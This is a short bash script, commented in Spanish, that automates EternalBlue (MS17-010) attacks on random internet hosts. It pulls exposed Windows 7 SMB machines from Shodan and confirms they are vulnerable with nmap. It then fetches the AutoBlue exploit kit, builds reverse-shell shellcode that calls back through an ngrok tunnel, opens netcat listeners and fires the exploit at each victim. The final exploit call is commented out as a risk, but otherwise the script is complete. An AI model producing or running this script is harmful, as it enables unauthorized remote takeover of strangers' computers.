#!/bin/bash

function eternal_blue_shodan()
{
	ip_victima=$1
	ip_atacante=$2
	puerto_atacante_ngrok=$3

	rm ./AutoBlue-MS17-010/shellcode/sc* 2>/dev/null

	./gen_payload.sh "$ip_atacante" "$puerto_atacante_ngrok"

	python3 ./AutoBlue-MS17-010/eternalblue_exploit7.py $ip_victima ./AutoBlue-MS17-010/shellcode/sc_x64.bin &>/dev/null
	python3 ./AutoBlue-MS17-010/eternalblue_exploit7.py $ip_victima ./AutoBlue-MS17-010/shellcode/sc_x86.bin &>/dev/null

	rm ./AutoBlue-MS17-010/shellcode/sc* 2>/dev/null

}

if [ ! -f "hosts_shodan" ]
then
	echo "[+] Creando hosts_shodan"
	#sudo shodan search --fields ip_str "Windows XP port:445" 2>/dev/null > hosts_shodan
	sudo shodan search --fields ip_str "Windows 7 port:445" 2>/dev/null > hosts_shodan
	#sudo shodan search --fields ip_str "Windows 8 port:445" 2>/dev/null > hosts_shodan
fi

posibles_hosts=$(cat hosts_shodan) # se necesitara un archivo con los hosts ya filtrados (shodan search --fields ip_str "windows 2008")

hosts_vulnerables=()

for host in ${posibles_hosts[@]}
do
	salida=$(nmap -p445 --script=smb-vuln-ms17-010.nse $host | grep "VULNERABLE")
	if [ "$salida" != "" ]
	then
		echo "[*] $host es vulnerable"
		hosts_vulnerables+=($host)
	fi
done


if [ ${#hosts_vulnerables[@]} -lt 1 ]
then
	echo "[!] No hay hosts vulnerables :("
	echo "[!] Ejecutalo con sudo o como root:"
	echo -e "\tsudo ./eternal_blue_exploiter_shodan.sh"
else
	if [ ! -d "AutoBlue-MS17-010" ]
	then
		git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git 2>/dev/null
	fi
	chmod +x ./AutoBlue-MS17-010/*py
	chmod +x ./AutoBlue-MS17-010/shellcode/*py

	rm ./AutoBlue-MS17-010/shellcode/sc* &>/dev/null

	read -p "[+] Introduce puerto (1 - 65535): " puerto_atacante

	xterm -hold -e "ngrok tcp $puerto_atacante" &

	read -p "[+] Introduce direccion de ngrok: " dir_atacante
	read -p "[+] Introduce puerto de ngrok: " puerto_ngrok

	for ip_victima in ${hosts_vulnerables[@]}
	do
		echo "[+] Explotando host: $ip_victima"

		xterm -hold -e "sudo nc -nlvp $puerto_atacante" &

		#eternal_blue_shodan $ip_victima $dir_atacante $puerto_ngrok # Descomentar si estas dispuesto a correr el riesgo

	done

fi